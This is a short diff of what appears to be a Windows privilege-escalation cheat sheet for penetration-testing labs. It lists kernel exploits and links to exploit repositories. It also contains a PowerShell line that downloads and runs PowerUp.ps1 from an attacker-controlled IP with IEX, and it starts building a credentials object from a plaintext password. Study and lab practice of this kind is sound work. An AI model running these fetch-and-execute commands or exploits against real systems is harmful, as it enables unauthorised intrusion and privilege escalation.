@@ -77,6 +77,8 @@ MS16-032 --> empire --> https://github.com/EmpireProject/Empire.git --> empire/d
 powerup --> empire echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/PowerUp.ps1') | powershell -noprofile -
   Either append Invoke-Allchecks at the bottom or after execution type Invoke-AllChecks
 MS15-051 --> https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
+[environment]::is64bitoperatingsystem
+
 
 #create credentials object
 $pass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
